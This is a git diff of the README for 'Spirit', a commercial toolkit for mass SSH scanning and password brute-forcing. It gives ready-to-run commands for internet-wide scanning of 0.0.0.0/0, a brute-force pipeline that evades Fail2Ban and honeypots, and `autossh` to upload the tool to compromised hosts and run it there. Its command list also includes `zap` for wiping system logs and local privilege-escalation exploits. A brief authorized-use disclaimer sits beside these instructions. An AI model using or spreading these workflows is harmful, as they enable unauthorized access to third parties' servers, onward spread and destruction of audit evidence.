@@ -1,197 +1,173 @@
-# Spirit - Network Pentest Tools
+# Spirit
 
-Spirit is a suite of high-performance tools for authorized network penetration testing and SSH security auditing. It is designed for experienced security professionals who need fast, reliable mass scanning, banner grabbing, and credential testing capabilities.
+**High-performance tools for authorized network pentesting and SSH security auditing.**
 
-<p align="left">  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a></p>
+Spirit is a specialized CLI toolkit for experienced security professionals. It excels at large-scale SSH discovery, banner grabbing, and intelligent credential testing with minimal network noise.
 
-### Install (recommended)
+<p align="left">
+  <a href="https://t.me/spiritNPT"><img width="160" height="50" src="https://i.imgur.com/N7AK7XY.png"></a>
+</p>
+
+## Installation
+
+The fastest way to get started:
 
 ```bash
 curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/install.sh | sh
+./spirit --help
 ```
 
 This installs `./spirit` into your current directory with checksum verification.
 
-### Quick Start with go.sh
+**Alternative:** Pre-built binaries are available in the [bin/](bin/) directory for air-gapped environments.
 
-The recommended way to run targeted zone scans.
+## Recommended: Targeted Zone Scans
 
-**Important:** The script must be run with `sudo` (masscan requires raw sockets).
+For most assessments, use the official `go.sh` wrapper. It orchestrates the full high-performance pipeline with automatic backups and dependency handling.
 
 ```bash
+# Get the wrapper
 curl -fsSL https://raw.githubusercontent.com/theaog/spirit/master/script/go.sh -o go.sh
 chmod +x go.sh
 
+# Define your targets
 cat > zone.lst << 'EOF'
 192.168.0.0/16
 10.1.1.0/24
+203.0.113.0/24
 EOF
 
-sudo ./go.sh --zone zone.lst --ports 22,23,2222 --rate 30000
+# Run the full pipeline (masscan → parse → banner → brute)
+sudo ./go.sh --zone zone.lst --ports 22,2222 --rate 30000
 ```
 
-**Notes**
-- Automatically installs `./spirit` (with checksum verification) and `masscan` when missing.
-- Backs up previous run artifacts into `./bak/` with timestamps.
-- Run `./go.sh --help` for all options.
+**Requirements:** `sudo` (masscan needs raw sockets). The script auto-installs `spirit` and `masscan` if missing.
 
-### Choosing your workflow
+### What the pipeline produces
 
-- **go.sh** (recommended) — One-shot targeted scanning of specific networks/zones with full parse → banner → brute pipeline. Ideal for focused assessments.
-- **spirit autobrute** (legacy) — Continuous, random, collision-free scanning forever. See the [Legacy Tools](#legacy-tools) section further below.
+| File            | Contents                              |
+|-----------------|---------------------------------------|
+| `open.lst`      | Raw masscan results                   |
+| `h.lst`         | Hosts in `IP:PORT` format             |
+| `b.lst`         | Hosts with SSH banners                |
+| `found.ssh`     | Successful logins (full details)      |
+| `found.login`   | Just `user:pass` pairs                |
+| `found.lst`     | `user:pass:host:port` (for autossh)   |
+| `found.errors`  | Connection failure statistics         |
+| `found.nologin` | Hosts that accepted creds but blocked shells |
 
-### Manual download (legacy)
+## The Spirit Pipeline
 
-For air-gapped or special environments, you can still download the pre-built binary directly:
+```
+zone.lst ──▶ masscan ──▶ parse ──▶ banner ──▶ brute ──▶ autossh
+                │            │          │         │
+           open.lst      h.lst      b.lst   found.*
+```
+
+After a successful brute run, use `autossh` to execute commands or upload tools across all compromised hosts in parallel:
 
 ```bash
-$ curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
-$ tar xvf spirit.tgz
-$ ./spirit --help
+./spirit autossh --command 'uname -a && id'
+./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
 ```
 
-## Upgrade Spirit automatically
-```bash
-./spirit upgrade
-Upgrading 87% [========================>     ] (5.9/5.9 MB, 49.652 MB/s)
-```
+## Command Reference
 
-## Spirit Brute|Banner vs Other...
+| Command      | Aliases     | Description |
+|--------------|-------------|-------------|
+| `brute`      | `B`         | SSH password brute-forcer with smart blocking, honeypot detection, and key auth support |
+| `brutekey`   | `K`         | Brute-force using private keys against users in your passfile |
+| `banner`     | `b`         | Fast, stealthy SSH version grabber (no login attempt) |
+| `autossh`    | `o`, `as`   | Concurrent SSH access to all hosts in `found.lst` — run commands or upload files |
+| `scan`       | `s`         | Fast LAN/open-port scanner (no root required) |
+| `masscan`    | `ms`        | Convenient wrapper around masscan using `zone.lst` |
+| `parse`      | `p`         | Convert masscan/nmap `-oG` output into clean `h.lst` |
+| `autobrute`  | `ab`        | Continuous random scanning + banner + brute loop (internet-wide) |
+| `ports`      | `P`         | Generate random port lists |
+| `zap`        | `z`         | Clean your tracks from wtmp/utmp/lastlog/auth.log/audit.log |
+| `exploit`    | `e`         | Run local privilege escalation exploits (CVEs) |
+| `abuse`      | —           | Check your egress IP against abuse databases |
+| `encrypt`    | `E`         | AES-256-GCM encrypt your `p.lst` passfile |
+| `upgrade`    | `u`         | Self-update to the latest version |
 
-### Spirit Banner
-- Stealthy, sends the least amount of TCP packets in order to retrieve the SSH version then breaks the connections without doing a Login
-- Proper connection handling and timeout, doesn't leave dead connections open wasting file descriptors
-- Fast, very fast and accurate
+Run `./spirit <command> --help` for detailed flags on any command.
 
-### Spirit Brute
-- Custom SSH lib allows interacting with more SSH versions, ciphers, algos and macs
-- Automatically removes unreachable IPs from the bruting cycle, less dull work = faster work
-- Automatically adjusts the number of threads based on remaining hosts
-- Tries to connect using Key files rather than just passwords
-- Detects Honeypots and stops throwing passwords at them
-- Tries 1 password per IP rather than throwing all passwords at the same host triggering Fail2Ban and protections of the sort
-- Randomizes IPs to avoid saturating a network with packets from the same source
-- Connects to multiple ports in the same hosts file
-- Autossh allows connecting to all vulnerable hosts at once
-- Allows submitting vulnerable hosts to your telegram channel
-- Encrypts your passfile to safely use it on unsecured systems
-- Excludes vuln found hosts, nologin hosts and honeypots from future scans: narrowing your search
-- Generates statistics and error logs
+## What Makes Spirit Different
 
-## Legacy Tools
+- **Stealthy banner grabbing** — Retrieves SSH versions with the absolute minimum packets, then immediately drops the connection.
+- **Intelligent brute-forcing** — One password per host, automatic removal of unreachable hosts, honeypot detection, and randomized ordering.
+- **Broad SSH compatibility** — Supports legacy ciphers and algorithms (cast128-cbc, idea-cbc, arcfour, 3des-cbc, hmac-md5, etc.) to reach old/IoT/embedded devices.
+- **Key-based auth support** — Will try provided private keys before falling back to passwords.
+- **Parallel post-exploitation** — `autossh` lets you run commands or stage tools across hundreds of hosts simultaneously.
+- **Stable output** — All `found.*` files are always written relative to where you launched the command.
+- **Context-aware cancellation** — Ctrl-C cleanly stops in-flight connections instead of waiting for timeouts.
 
-These older workflows are preserved for users who prefer manual control or have specific environment constraints.
+## Continuous / Internet-Wide Scanning
 
-### Manual binary download
-
-```bash
-curl -OL https://github.com/theaog/spirit/raw/refs/heads/master/bin/spirit.tgz
-tar xvf spirit.tgz
-./spirit --help
-```
-
-### Autobrute (continuous random scanning)
+For the classic "point it at the internet and walk away" workflow:
 
 ```bash
 cat > zone.lst << 'EOF'
-192.168.0.0/16
-10.0.0.0/8
+0.0.0.0/0
 EOF
 
 ./spirit autobrute
 ```
 
-### Local network demo (autobrute)
+This loops forever: masscan on random ports → banner → brute → repeat.
 
-[![asciicast](https://asciinema.org/a/645079.svg)](https://asciinema.org/a/645079?autoplay=true&loop=true)
+> **Note:** Most users doing targeted assessments should prefer `./go.sh` instead.
 
-> **Note:** For most targeted work, prefer `./go.sh` (see Quick Start above).
+## Licensing (Freemium)
 
-## Example usage for SSH brute flow TLDR;
+- **Port 22** is fully functional with a 1-hour trial window per run.
+- All other ports require a paid license.
+- Pricing: **$1 per server per day** (XMR only).
 
-> For most targeted assessments, use the `./go.sh` wrapper (see Quick Start above) instead of running the individual commands manually.
-
-```bash
-$ masscan \
-    --rate="50000" \
-    --ports "22,222,2222,2212" 0.0.0.0/0 \
-    --exclude 255.255.255.255 \
-    -oG open.lst
-Scanning 4294967295 hosts [4 ports/host]
-# masscan will create an open.lst file in oG (output Greppable) format.
-
-$ ./spirit parse
-INFO created h.lst in HOST:PORT format
-
-$ cat > filter.lst << 'EOF'
-SSH-1.0
-SSH-2.0-CISCO
-SSH-2.0-Comware
-EOF
-
-$ ./spirit banner
-INFO backing up h.lst to h.lst.bak
-...
-INFO created h.lst in HOST:PORT:BANNER format
-
-$ cat > p.lst << 'EOF'
-user1:pass1
-user1:pass2
-user2:pass50
-EOF
-
-$ ./spirit brute
-...
-[2478/4653]root:!1qwerty [77]found [33]blocked [1284]threads 20% [====>               ] [20s:1h13m36s]
-Results
-  |- found.ssh
-  |- found.login
-  |- found.lst
-  |- found.errors
-
-$ ./spirit brute --block=true
-
-$ ./spirit autossh --command 'whoami && uptime'
-$ ./spirit autossh --upload ./spirit --command '/tmp/spirit scan --lan'
-```
-
-## Spirit is Freemium
-Scanning port 22 is unlimited for an hour, any other port requires a license which starts at $1/day/server.
-
-## You can unlock Spirit's full functionality directly from the CLI by obtaining a license.
 ```bash
 ./spirit buy
-
-Payment-flow Support @ https://t.me/spiritNPT
-Pricing model: $1 / Server / Day
-
-┃ How many servers?> 1
-
-┃ How many days?> 10
 ```
 
-> If you encounter any issues with the payment, please reach out to us on [Telegram](https://t.me/spiritNPT) or open an [issue](https://github.com/theaog/spirit/issues).
+After purchase, activate with:
 
-# Support our development
+```bash
+./spirit register
+```
 
-## Monero (XMR) thank you! (our favorite)
-`895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s`
+Support is available on [Telegram](https://t.me/spiritNPT).
 
-![xmrqr](asset/xmrqr.png)
+## Support the Project
 
-## Bitcoin (BTC) thank you too!
-`bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5`
+**Monero (XMR) — preferred**
 
-## Get Help & Support
-Open a GitHub [issue](https://github.com/theaog/spirit/issues) and consider encrypting your message using this pub key [aog.gpg](asset/aog.gpg).
+```
+895LJnKcfTv7NHf7SN1zz5UzhBRwwvdR8NYLvXNr54jJ3GXghBoyfBKLp2dL4GcYohQatRnigct8zgK6utkjjeBxVNsky1s
+```
 
-Don't forget to give us a Star!
+![Monero QR](asset/xmrqr.png)
 
-> [!NOTE]
-Spirit is clean software the only data it sends home is a server hash to verify the license.
-We will never compromise our integrity.
+**Bitcoin (BTC)**
 
-# Disclaimer
+```
+bc1q7plm79dgllrhrjz772x4vjrtvu9yy03738psy5
+```
+
+## Legal & Disclaimer
 
 > [!IMPORTANT]
-> This tool should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it on your own systems and/or with the system owner's permission. Usage of any tools in this repository for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused.
+> This software is provided **only for authorized penetration testing and educational purposes**.
+>
+> You must have explicit written permission from the owner of any systems you scan or attack. Unauthorized access is illegal in most jurisdictions. The authors are not responsible for any misuse or damage caused by this tool.
+
+## Community
+
+- **Telegram**: [t.me/spiritNPT](https://t.me/spiritNPT)
+- **Issues**: [GitHub Issues](https://github.com/theaog/spirit/issues)
+
+Don't forget to ⭐ the repo if you find Spirit useful.
+
+---
+
+<p align="center">
+  <sub>(c) The Armor of God — Clean software. Only license verification data is ever sent home.</sub>
+</p>
